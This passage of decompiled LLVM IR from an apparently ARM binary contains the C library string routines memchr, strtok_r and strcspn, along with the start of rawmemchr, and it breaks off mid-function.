  uselistorder i32 %v0_1b4e4, { 1, 2, 0, 3 }
  uselistorder i32 %v2_1b4e8, { 1, 0 }
  uselistorder i32 %v7_1b4dc, { 0, 2, 1 }
  uselistorder i32 %v10_1b4d8, { 1, 0 }
  uselistorder i32 %v9_1b4d0, { 1, 0, 2 }
  uselistorder i32 %v6_1b4cc, { 1, 0 }
  uselistorder i32 %v2_1b4c4, { 0, 2, 1, 3, 5, 6, 4, 7 }
  uselistorder i32 %v0_1b4c4, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_1b4d4, { 0, 3, 2, 1 }
  uselistorder i32 %v7_1b4b8, { 0, 2, 1 }
  uselistorder i32 %v13_1b4b4, { 1, 0 }
  uselistorder i32 %v4_1b4b0, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_1b4b0, { 2, 0, 1 }
  uselistorder i32 %v6_1b4b8, { 0, 3, 2, 1 }
  uselistorder i32 %v7_1b4a8, { 0, 2, 1 }
  uselistorder i32 %v16_1b4a4, { 1, 0 }
  uselistorder i32 %v4_1b4a0, { 1, 2, 0 }
  uselistorder i32 %v0_1b4b0.pr, { 1, 3, 0, 2 }
  uselistorder i32 %v6_1b4a8, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_1b494, { 0, 3, 2, 1 }
  uselistorder i32 %v10_1b490, { 1, 0 }
  uselistorder i32 %v1_1b48c, { 1, 0 }
  uselistorder i32 %v10_1b488, { 1, 0 }
  uselistorder i32 %v0_1b488, { 3, 2, 1, 0 }
  uselistorder i32 %v0_1b48c, { 0, 1, 2, 3, 7, 6, 5, 4 }
  uselistorder i32 %v2_1b480, { 0, 2, 1 }
  uselistorder i32 %v2_1b474, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_1b474, { 1, 2, 6, 3, 0, 5, 4 }
  uselistorder i32 %v0_1b48c36, { 1, 2, 0 }
  uselistorder i32 %v1_1b46c, { 2, 1, 0 }
  uselistorder i32 %v1_1b464, { 2, 3, 1, 0 }
  uselistorder i32 %v2_1b45c, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v2_1b458, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32 %v2_1b454, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v1_1b454, { 3, 4, 0, 6, 5, 1, 2 }
  uselistorder i32 %v1_1b444, { 0, 2, 1 }
  uselistorder i32 %v4_1b440, { 1, 0 }
  uselistorder i32 %v3_1b434, { 1, 0 }
  uselistorder i32 %v1_1b42c, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_1b420, { 1, 0 }
  uselistorder i32 %v12_1b41c, { 0, 2, 1 }
  uselistorder i32 %v8_1b3fc, { 1, 0, 2 }
  uselistorder i32 %v5_1b3fc, { 1, 0, 2 }
  uselistorder i32 %v2_1b3fc, { 1, 0, 2 }
  uselistorder i32 %v0_1b3fc, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_1b41c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_1b3d8, { 0, 2, 1 }
  uselistorder i32 %v4_1b3d4, { 1, 0 }
  uselistorder i32 %v3_1b3c8, { 1, 0 }
  uselistorder i32 %v1_1b3c0, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_1b3b4, { 1, 0 }
  uselistorder i32 %v12_1b3b0, { 0, 2, 1 }
  uselistorder i32 %v8_1b390, { 1, 0, 2 }
  uselistorder i32 %v5_1b390, { 1, 0, 2 }
  uselistorder i32 %v2_1b390, { 1, 0, 2 }
  uselistorder i32 %v0_1b390, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_1b3b0, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_1b36c, { 0, 2, 1 }
  uselistorder i32 %v4_1b368, { 1, 0 }
  uselistorder i32 %v3_1b35c, { 1, 0 }
  uselistorder i32 %v1_1b354, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_1b348, { 1, 0 }
  uselistorder i32 %v12_1b344, { 0, 2, 1 }
  uselistorder i32 %v8_1b324, { 1, 0, 2 }
  uselistorder i32 %v5_1b324, { 1, 0, 2 }
  uselistorder i32 %v2_1b324, { 1, 0, 2 }
  uselistorder i32 %v0_1b324, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_1b344, { 4, 3, 2, 1, 0 }
  uselistorder i1 %v2_1b380, { 0, 2, 1 }
  uselistorder i32 %v1_1b37c, { 2, 0, 1, 3 }
  uselistorder i32 %v4_1b300, { 2, 0, 1, 3 }
  uselistorder i32 %v2_1b300, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1b384, { 1, 0, 3, 2 }
  uselistorder i32 %v0_1b41c75, { 0, 5, 1, 3, 2, 4 }
  uselistorder i32 %v1_1b2f4, { 1, 0 }
  uselistorder i32 %v0_1b2f4, { 3, 1, 0, 2 }
  uselistorder i32 %v2_1b2ec, { 2, 4, 0, 5, 1, 3 }
  uselistorder i32 %v1_1b2ec, { 1, 0, 2 }
  uselistorder i32 %v0_1b2ec, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1b41c76, { 1, 0 }
  uselistorder i32 %v1_1b2cc, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_1b2d4, { 1, 0 }
  uselistorder i32 %v0_1b2a8, { 3, 0, 1, 2 }
  uselistorder i32 %v1_1b29c, { 1, 2, 0, 3 }
  uselistorder i32 %v5_1b288, { 1, 0, 2 }
  uselistorder i32 %v1_1b284, { 1, 0 }
  uselistorder i32 %v1_1b27c, { 2, 0, 1, 4, 5, 3, 6 }
  uselistorder i32 %v0_1b27c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_1b274, { 0, 2, 1 }
  uselistorder i32 %v3_1b274, { 3, 0, 1, 2 }
  uselistorder i1 %v0_1b274, { 1, 0 }
  uselistorder i1 %v1_1b274, { 1, 0 }
  uselistorder i32 %v3_1b270, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_1b268, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_1b254, { 1, 2, 0 }
  uselistorder i32 %v1_1b24c, { 0, 2, 1 }
  uselistorder i32 %v12_1b248, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1b23c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_1b240, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 11, 10, 9, 8 }
  uselistorder i32 %v1_1b230, { 0, 2, 1 }
  uselistorder i32 %v1_1b228, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_1b228, { 1, 2, 3, 0, 5, 4 }
  uselistorder i32 %v1_1b220, { 1, 0 }
  uselistorder i32 %v1_1b218, { 2, 1, 0 }
  uselistorder i32 %v2_1b210, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v0_1b210, { 1, 4, 0, 2, 3 }
  uselistorder i32 %v8_1b20c, { 1, 0 }
  uselistorder i32 %v2_1b200, { 1, 0 }
  uselistorder i32 %v1_1b200, { 1, 4, 5, 3, 0, 6, 8, 2, 7, 9 }
  uselistorder i32 %v0_1b200, { 1, 7, 8, 6, 4, 0, 5, 10, 2, 3, 9, 11 }
  uselistorder i8** %stack_var_-8, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 15, 16, 17, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 26, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32* %r2.global-to-local, { 0, 68, 1, 2, 3, 4, 5, 69, 6, 7, 8, 9, 10, 70, 11, 12, 66, 67, 71, 27, 13, 15, 14, 16, 17, 18, 19, 20, 21, 23, 22, 24, 25, 26, 28, 29, 61, 30, 31, 32, 33, 34, 62, 35, 36, 37, 38, 39, 63, 40, 41, 42, 43, 44, 64, 45, 46, 47, 49, 48, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 65 }
  uselistorder i32* %r1.global-to-local, { 2, 5, 3, 77, 4, 6, 8, 10, 7, 78, 9, 11, 13, 75, 12, 79, 74, 76, 80, 83, 81, 87, 88, 14, 15, 16, 18, 17, 19, 20, 82, 21, 22, 84, 23, 85, 24, 86, 25, 26, 27, 28, 29, 31, 33, 30, 45, 32, 34, 36, 38, 35, 46, 37, 39, 41, 43, 40, 47, 42, 44, 48, 49, 54, 50, 52, 51, 53, 55, 58, 56, 59, 57, 60, 61, 67, 62, 63, 68, 64, 69, 65, 70, 66, 71, 72, 73, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 56, 3, 4, 57, 5, 6, 58, 7, 55, 61, 62, 8, 9, 21, 10, 12, 11, 13, 14, 59, 15, 16, 60, 17, 18, 19, 20, 22, 23, 31, 24, 25, 32, 26, 27, 33, 28, 29, 34, 30, 35, 36, 38, 37, 39, 40, 42, 41, 43, 44, 50, 51, 45, 46, 47, 52, 48, 49, 53, 54, 0, 1 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 5, 35, 36, 37, 6, 7, 8, 9, 10, 11, 12, 13, 14, 23, 15, 16, 17, 24, 18, 19, 20, 25, 21, 22, 26, 27, 28, 29, 30, 31, 32, 33, 34 }
  uselistorder i1* %cpsr_z.global-to-local, { 3, 5, 47, 7, 46, 8, 6, 44, 45, 9, 10, 11, 12, 13, 14, 15, 16, 2, 17, 18, 19, 20, 21, 4, 22, 0, 23, 1, 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43 }
  uselistorder i1* %cpsr_v.global-to-local, { 2, 4, 43, 6, 42, 7, 5, 41, 8, 9, 10, 11, 12, 13, 14, 15, 16, 1, 17, 18, 19, 3, 20, 44, 21, 0, 23, 22, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40 }
  uselistorder i1* %cpsr_n.global-to-local, { 2, 4, 49, 6, 48, 7, 5, 46, 47, 8, 9, 10, 11, 12, 13, 14, 15, 16, 1, 17, 18, 19, 20, 21, 3, 22, 50, 23, 0, 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45 }
  uselistorder i32 2147483632, { 3, 4, 5, 2, 0, 1 }
  uselistorder i32 -5, { 1, 0, 2 }
  uselistorder i32 -28, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_1b670, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1b604, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1b598, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1b538, { 1, 0 }
  uselistorder label %.thread13, { 2, 0, 1 }
  uselistorder label %.thread128, { 1, 0 }
  uselistorder label %bb150, { 4, 5, 6, 3, 7, 0, 1, 2 }
  uselistorder label %dec_label_pc_1b4c4, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_1b488, { 1, 0 }
  uselistorder label %dec_label_pc_1b474, { 1, 0 }
  uselistorder label %dec_label_pc_1b434, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1b3c8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1b35c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1b2fc, { 1, 0 }
  uselistorder label %.thread127, { 1, 0 }
  uselistorder label %.thread126, { 1, 0 }
  uselistorder label %dec_label_pc_1b2cc, { 1, 0 }
  uselistorder label %.thread125, { 1, 0 }
  uselistorder label %.thread124, { 1, 0 }
  uselistorder label %bb142, { 1, 0 }
  uselistorder label %bb140, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %.thread114, { 1, 0 }
  uselistorder label %dec_label_pc_1b268, { 1, 0 }
  uselistorder label %bb137, { 1, 0 }
  uselistorder label %dec_label_pc_1b228, { 1, 0 }
}

define i32 @__GI_memchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_1b694 = urem i32 %arg1, 256
  %v0_1b6b0.pr = load i32, i32* @r2, align 4
  %v2_1b6b015 = icmp eq i32 %v0_1b6b0.pr, 0
  %v0_1b6c4.pre = load i32, i32* @r0, align 4
  br i1 %v2_1b6b015, label %dec_label_pc_1b6c0, label %dec_label_pc_1b6b8

dec_label_pc_1b69c:                               ; preds = %dec_label_pc_1b6b8
  %v1_1b69c = inttoptr i32 %v0_1b6ac to i8*
  %v2_1b69c = load i8, i8* %v1_1b69c, align 1
  %v3_1b69c = zext i8 %v2_1b69c to i32
  %v9_1b6a0 = icmp eq i32 %v3_1b69c, %v1_1b694
  br i1 %v9_1b6a0, label %dec_label_pc_1b770, label %dec_label_pc_1b6a8

dec_label_pc_1b6a8:                               ; preds = %dec_label_pc_1b69c
  %v1_1b6a8 = add i32 %v0_1b6a8, -1
  %v1_1b6ac = add i32 %v0_1b6ac, 1
  %v2_1b6b0 = icmp eq i32 %v1_1b6a8, 0
  br i1 %v2_1b6b0, label %dec_label_pc_1b6c0, label %dec_label_pc_1b6b8

dec_label_pc_1b6b8:                               ; preds = %entry, %dec_label_pc_1b6a8
  %v0_1b6a8 = phi i32 [ %v1_1b6a8, %dec_label_pc_1b6a8 ], [ %v0_1b6b0.pr, %entry ]
  %v0_1b6ac = phi i32 [ %v1_1b6ac, %dec_label_pc_1b6a8 ], [ %v0_1b6c4.pre, %entry ]
  %v1_1b6b8 = urem i32 %v0_1b6ac, 4
  %v2_1b6b8 = icmp eq i32 %v1_1b6b8, 0
  br i1 %v2_1b6b8, label %dec_label_pc_1b6c0, label %dec_label_pc_1b69c

dec_label_pc_1b6c0:                               ; preds = %dec_label_pc_1b6a8, %dec_label_pc_1b6b8, %entry
  %v0_1b73c22 = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_1b6a8 ], [ %v0_1b6a8, %dec_label_pc_1b6b8 ]
  %v0_1b6c4 = phi i32 [ %v0_1b6c4.pre, %entry ], [ %v1_1b6ac, %dec_label_pc_1b6a8 ], [ %v0_1b6ac, %dec_label_pc_1b6b8 ]
  %v4_1b6c0 = mul nuw nsw i32 %v1_1b694, 256
  %v5_1b6c0 = or i32 %v4_1b6c0, %v1_1b694
  %v4_1b6c8 = mul i32 %v5_1b6c0, 65536
  %v5_1b6c8 = or i32 %v4_1b6c8, %v5_1b6c0
  store i32 2130640639, i32* @ip, align 4
  %tmp = icmp ugt i32 %v0_1b73c22, 3
  br i1 %tmp, label %dec_label_pc_1b6d0, label %dec_label_pc_1b764.preheader

dec_label_pc_1b6d0:                               ; preds = %dec_label_pc_1b6c0, %dec_label_pc_1b73c.backedge
  %v0_1b6ec60 = phi i32 [ %v1_1b6ec, %dec_label_pc_1b73c.backedge ], [ %v0_1b73c22, %dec_label_pc_1b6c0 ]
  %v0_1b71059 = phi i32 [ %v4_1b6d0, %dec_label_pc_1b73c.backedge ], [ %v0_1b6c4, %dec_label_pc_1b6c0 ]
  %v1_1b6d0 = inttoptr i32 %v0_1b71059 to i32*
  %v2_1b6d0 = load i32, i32* %v1_1b6d0, align 4
  %v4_1b6d0 = add i32 %v0_1b71059, 4
  %v2_1b6d4 = xor i32 %v2_1b6d0, %v5_1b6c8
  %v2_1b6d8 = add i32 %v2_1b6d4, 2130640639
  %v1_1b6dc = sub i32 -1, %v2_1b6d4
  %v2_1b6e0 = xor i32 %v2_1b6d8, %v1_1b6dc
  %v2_1b6e4 = and i32 %v2_1b6e0, -2130640640
  %v2_1b6e8 = icmp eq i32 %v2_1b6e4, 0
  %v1_1b6ec = add i32 %v0_1b6ec60, -4
  br i1 %v2_1b6e8, label %dec_label_pc_1b73c.backedge, label %dec_label_pc_1b6f4

dec_label_pc_1b73c.backedge:                      ; preds = %dec_label_pc_1b6d0, %dec_label_pc_1b72c
  store i32 2130640639, i32* @ip, align 4
  %tmp73 = icmp ugt i32 %v1_1b6ec, 3
  br i1 %tmp73, label %dec_label_pc_1b6d0, label %dec_label_pc_1b764.preheader

dec_label_pc_1b6f4:                               ; preds = %dec_label_pc_1b6d0
  %v2_1b6f4 = inttoptr i32 %v0_1b71059 to i8*
  %v3_1b6f4 = load i8, i8* %v2_1b6f4, align 1
  %v4_1b6f4 = zext i8 %v3_1b6f4 to i32
  %v9_1b6fc = icmp eq i32 %v4_1b6f4, %v1_1b694
  %v1_1b700 = add i32 %v0_1b71059, 3
  store i32 %v1_1b700, i32* @ip, align 4
  br i1 %v9_1b6fc, label %dec_label_pc_1b770, label %dec_label_pc_1b708

dec_label_pc_1b708:                               ; preds = %dec_label_pc_1b6f4
  %v1_1b708 = add i32 %v0_1b71059, 1
  %v2_1b708 = inttoptr i32 %v1_1b708 to i8*
  %v3_1b708 = load i8, i8* %v2_1b708, align 1
  %v4_1b708 = zext i8 %v3_1b708 to i32
  %v9_1b70c = icmp eq i32 %v4_1b708, %v1_1b694
  br i1 %v9_1b70c, label %bb, label %dec_label_pc_1b71c

bb:                                               ; preds = %dec_label_pc_1b708
  br label %dec_label_pc_1b770

dec_label_pc_1b71c:                               ; preds = %dec_label_pc_1b708
  %v1_1b71c = add i32 %v0_1b71059, 2
  %v2_1b71c = inttoptr i32 %v1_1b71c to i8*
  %v3_1b71c = load i8, i8* %v2_1b71c, align 1
  %v4_1b71c = zext i8 %v3_1b71c to i32
  %v9_1b720 = icmp eq i32 %v4_1b71c, %v1_1b694
  br i1 %v9_1b720, label %dec_label_pc_1b770, label %dec_label_pc_1b72c

dec_label_pc_1b72c:                               ; preds = %dec_label_pc_1b71c
  %v2_1b72c = inttoptr i32 %v1_1b700 to i8*
  %v3_1b72c = load i8, i8* %v2_1b72c, align 1
  %v4_1b72c = zext i8 %v3_1b72c to i32
  %v9_1b730 = icmp eq i32 %v4_1b72c, %v1_1b694
  br i1 %v9_1b730, label %bb36, label %dec_label_pc_1b73c.backedge

bb36:                                             ; preds = %dec_label_pc_1b72c
  br label %dec_label_pc_1b770

dec_label_pc_1b764.preheader:                     ; preds = %dec_label_pc_1b73c.backedge, %dec_label_pc_1b6c0
  %v0_1b710.lcssa = phi i32 [ %v0_1b6c4, %dec_label_pc_1b6c0 ], [ %v4_1b6d0, %dec_label_pc_1b73c.backedge ]
  %v0_1b6ec.lcssa = phi i32 [ %v0_1b73c22, %dec_label_pc_1b6c0 ], [ %v1_1b6ec, %dec_label_pc_1b73c.backedge ]
  %v2_1b7647 = icmp eq i32 %v0_1b6ec.lcssa, 0
  br i1 %v2_1b7647, label %dec_label_pc_1b76c, label %dec_label_pc_1b754

dec_label_pc_1b754:                               ; preds = %dec_label_pc_1b760, %dec_label_pc_1b764.preheader
  %v0_1b764.in = phi i32 [ %v0_1b764, %dec_label_pc_1b760 ], [ %v0_1b6ec.lcssa, %dec_label_pc_1b764.preheader ]
  %v0_1b760 = phi i32 [ %v1_1b760, %dec_label_pc_1b760 ], [ %v0_1b710.lcssa, %dec_label_pc_1b764.preheader ]
  %v0_1b764 = add i32 %v0_1b764.in, -1
  %v1_1b754 = inttoptr i32 %v0_1b760 to i8*
  %v2_1b754 = load i8, i8* %v1_1b754, align 1
  %v3_1b754 = zext i8 %v2_1b754 to i32
  %v9_1b758 = icmp eq i32 %v3_1b754, %v1_1b694
  br i1 %v9_1b758, label %dec_label_pc_1b770, label %dec_label_pc_1b760

dec_label_pc_1b760:                               ; preds = %dec_label_pc_1b754
  %v1_1b760 = add i32 %v0_1b760, 1
  %v2_1b764 = icmp eq i32 %v0_1b764, 0
  br i1 %v2_1b764, label %dec_label_pc_1b76c, label %dec_label_pc_1b754

dec_label_pc_1b76c:                               ; preds = %dec_label_pc_1b760, %dec_label_pc_1b764.preheader
  br label %dec_label_pc_1b770

dec_label_pc_1b770:                               ; preds = %dec_label_pc_1b69c, %dec_label_pc_1b71c, %dec_label_pc_1b6f4, %dec_label_pc_1b754, %bb36, %bb, %dec_label_pc_1b76c
  %v1_1b774 = phi i32 [ 0, %dec_label_pc_1b76c ], [ %v1_1b708, %bb ], [ %v1_1b700, %bb36 ], [ %v0_1b760, %dec_label_pc_1b754 ], [ %v1_1b71c, %dec_label_pc_1b71c ], [ %v0_1b71059, %dec_label_pc_1b6f4 ], [ %v0_1b6ac, %dec_label_pc_1b69c ]
  ret i32 %v1_1b774

; uselistorder directives
  uselistorder i32 %v1_1b6ec, { 1, 0, 2 }
  uselistorder i32 %v0_1b71059, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v5_1b6c0, { 1, 0 }
  uselistorder i32 %v0_1b73c22, { 1, 2, 0 }
  uselistorder i32 %v0_1b6ac, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v0_1b6c4.pre, { 1, 0 }
  uselistorder i32 %v1_1b694, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder label %dec_label_pc_1b770, { 6, 3, 4, 1, 5, 2, 0 }
  uselistorder label %dec_label_pc_1b73c.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_1b6d0, { 1, 0 }
  uselistorder label %dec_label_pc_1b6c0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1b6b8, { 1, 0 }
}

define i32 @strtok_r() local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1b780 = load i32, i32* @r4, align 4
  store i32 %v3_1b780, i32* %stack_var_-16, align 4
  %v0_1b784 = load i32, i32* @r0, align 4
  store i32 %v0_1b784, i32* %r4.global-to-local, align 4
  %v2_1b784 = icmp eq i32 %v0_1b784, 0
  %v1_1b788 = load i32, i32* @r2, align 4
  br i1 %v2_1b784, label %bb, label %entry._crit_edge

bb:                                               ; preds = %entry
  %v2_1b788 = inttoptr i32 %v1_1b788 to i32*
  %v3_1b788 = load i32, i32* %v2_1b788, align 4
  store i32 %v3_1b788, i32* %r4.global-to-local, align 4
  br label %entry._crit_edge

entry._crit_edge:                                 ; preds = %entry, %bb
  %v0_1b78c = phi i32 [ %v3_1b788, %bb ], [ %v0_1b784, %entry ]
  store i32 %v0_1b78c, i32* @r0, align 4
  store i32 %v1_1b788, i32* %r5.global-to-local, align 4
  %v0_1b794 = load i32, i32* @r1, align 4
  store i32 %v0_1b794, i32* %r6.global-to-local, align 4
  %v1_1b798 = inttoptr i32 %v0_1b78c to i8*
  %v2_1b798 = call i32 @__GI_strspn(i8* %v1_1b798)
  %v0_1b79c = load i32, i32* %r4.global-to-local, align 4
  %v2_1b79c = add i32 %v0_1b79c, %v2_1b798
  %v3_1b79c = inttoptr i32 %v2_1b79c to i8*
  %v4_1b79c = load i8, i8* %v3_1b79c, align 1
  %v6_1b79c = zext i8 %v4_1b79c to i32
  store i32 %v6_1b79c, i32* %r3.global-to-local, align 4
  store i32 %v2_1b79c, i32* @r4, align 4
  %v2_1b7a4 = icmp eq i8 %v4_1b79c, 0
  br i1 %v2_1b7a4, label %bb8, label %dec_label_pc_1b7b0

bb8:                                              ; preds = %entry._crit_edge
  %v2_1b7a8 = load i32, i32* %r5.global-to-local, align 4
  %v3_1b7a8 = inttoptr i32 %v2_1b7a8 to i32*
  store i32 %v2_1b79c, i32* %v3_1b7a8, align 4
  br label %dec_label_pc_1b7ec

dec_label_pc_1b7b0:                               ; preds = %entry._crit_edge
  %v0_1b7b0 = load i32, i32* %r6.global-to-local, align 4
  %v3_1b7b8 = call i32 @__GI_strpbrk(i8* %v3_1b79c, i32 %v0_1b7b0)
  %v3_1b7bc = icmp eq i32 %v3_1b7b8, 0
  br i1 %v3_1b7bc, label %dec_label_pc_1b7c4, label %dec_label_pc_1b7dc

dec_label_pc_1b7c4:                               ; preds = %dec_label_pc_1b7b0
  %v0_1b7c8 = load i32, i32* @r4, align 4
  store i32 %v0_1b7c8, i32* @r0, align 4
  %v2_1b7cc = call i32 @rawmemchr(i32 %v0_1b7c8, i32 0)
  %v0_1b7d0 = load i32, i32* @r4, align 4
  store i32 %v0_1b7d0, i32* %r3.global-to-local, align 4
  %v1_1b7d4 = load i32, i32* %r5.global-to-local, align 4
  %v2_1b7d4 = inttoptr i32 %v1_1b7d4 to i32*
  store i32 %v2_1b7cc, i32* %v2_1b7d4, align 4
  br label %dec_label_pc_1b7ec

dec_label_pc_1b7dc:                               ; preds = %dec_label_pc_1b7b0
  %v4_1b7b8 = inttoptr i32 %v3_1b7b8 to i8*
  store i8 0, i8* %v4_1b7b8, align 1
  %v7_1b7e0 = add i32 %v3_1b7b8, 1
  %v1_1b7e4 = load i32, i32* %r5.global-to-local, align 4
  %v2_1b7e4 = inttoptr i32 %v1_1b7e4 to i32*
  store i32 %v7_1b7e0, i32* %v2_1b7e4, align 4
  %v0_1b7e8 = load i32, i32* @r4, align 4
  store i32 %v0_1b7e8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1b7ec

dec_label_pc_1b7ec:                               ; preds = %bb8, %dec_label_pc_1b7c4, %dec_label_pc_1b7dc
  %v0_1b7ec = load i32, i32* %r3.global-to-local, align 4
  %v2_1b7f0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1b7f0, i32* @r4, align 4
  ret i32 %v0_1b7ec

; uselistorder directives
  uselistorder i32 %v3_1b7b8, { 0, 2, 1 }
  uselistorder i32 %v0_1b78c, { 1, 0 }
  uselistorder i32 %v0_1b784, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1b7ec, { 2, 1, 0 }
  uselistorder label %entry._crit_edge, { 1, 0 }
}

define i32 @strcspn() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v3_1b7f8 = load i32, i32* @r4, align 4
  store i32 %v3_1b7f8, i32* %stack_var_-16, align 4
  %v6_1b7f8 = load i32, i32* @r5, align 4
  %v9_1b7f8 = load i32, i32* @r6, align 4
  %v0_1b7fc = load i32, i32* @r0, align 4
  %v0_1b800 = load i32, i32* @r1, align 4
  store i32 %v0_1b800, i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v1_1b81c8 = inttoptr i32 %v0_1b7fc to i8*
  %v2_1b81c9 = load i8, i8* %v1_1b81c8, align 1
  %v2_1b82011 = icmp eq i8 %v2_1b81c9, 0
  store i32 %v0_1b800, i32* @r0, align 4
  %v1_1b82812 = add i32 %v0_1b7fc, 1
  store i32 %v1_1b82812, i32* @r4, align 4
  br i1 %v2_1b82011, label %dec_label_pc_1b830, label %dec_label_pc_1b80c

dec_label_pc_1b80c:                               ; preds = %entry, %dec_label_pc_1b818
  %v3_1b81c14.in = phi i8 [ %v2_1b81c, %dec_label_pc_1b818 ], [ %v2_1b81c9, %entry ]
  %v0_1b82413 = phi i32 [ %v0_1b824.pre, %dec_label_pc_1b818 ], [ %v0_1b800, %entry ]
  %v3_1b81c14 = zext i8 %v3_1b81c14.in to i32
  %v2_1b80c = call i32 @__GI_strchr(i32 %v0_1b82413, i32 %v3_1b81c14)
  %v2_1b810 = icmp eq i32 %v2_1b80c, 0
  %v0_1b818 = load i32, i32* @r5, align 4
  br i1 %v2_1b810, label %dec_label_pc_1b818, label %dec_label_pc_1b830

dec_label_pc_1b818:                               ; preds = %dec_label_pc_1b80c
  %v1_1b818 = add i32 %v0_1b818, 1
  %v0_1b81c.pre = load i32, i32* @r4, align 4
  %v0_1b824.pre = load i32, i32* @r6, align 4
  store i32 %v1_1b818, i32* @r5, align 4
  %v1_1b81c = inttoptr i32 %v0_1b81c.pre to i8*
  %v2_1b81c = load i8, i8* %v1_1b81c, align 1
  %v2_1b820 = icmp eq i8 %v2_1b81c, 0
  store i32 %v0_1b824.pre, i32* @r0, align 4
  %v1_1b828 = add i32 %v0_1b81c.pre, 1
  store i32 %v1_1b828, i32* @r4, align 4
  br i1 %v2_1b820, label %dec_label_pc_1b830, label %dec_label_pc_1b80c

dec_label_pc_1b830:                               ; preds = %dec_label_pc_1b818, %dec_label_pc_1b80c, %entry
  %v0_1b830 = phi i32 [ 0, %entry ], [ %v0_1b818, %dec_label_pc_1b80c ], [ %v1_1b818, %dec_label_pc_1b818 ]
  %v2_1b834 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1b834, i32* @r4, align 4
  store i32 %v6_1b7f8, i32* @r5, align 4
  store i32 %v9_1b7f8, i32* @r6, align 4
  ret i32 %v0_1b830

; uselistorder directives
  uselistorder i8 %v2_1b81c, { 1, 0 }
  uselistorder i32 %v0_1b824.pre, { 1, 0 }
  uselistorder i32 %v0_1b81c.pre, { 1, 0 }
  uselistorder label %dec_label_pc_1b80c, { 1, 0 }
}

define i32 @rawmemchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_1b840 = urem i32 %arg1, 256
  %v0_1b8582 = load i32, i32* @r0, align 4
  %v1_1b8583 = urem i32 %v0_1b8582, 4
  %v2_1b8584 = icmp eq i32 %v1_1b8583, 0
  br i1 %v2_1b8584, label %dec_label_pc_1b860, label %dec_label_pc_1b848

dec_label_pc_1b848:                               ; preds = %entry, %dec_label_pc_1b854
  %v0_1b854 = phi i32 [ %v1_1b854, %dec_label_pc_1b854 ], [ %v0_1b8582, %entry ]
  %v1_1b848 = inttoptr i32 %v0_1b854 to i8*
  %v2_1b848 = load i8, i8* %v1_1b848, align 1
  %v3_1b848 = zext i8 %v2_1b848 to i32
  %v9_1b84c = icmp eq i32 %v3_1b848, %v1_1b840
  br i1 %v9_1b84c, label %dec_label_pc_1b8dc, label %dec_label_pc_1b854

dec_label_pc_1b854:                               ; preds = %dec_label_pc_1b848
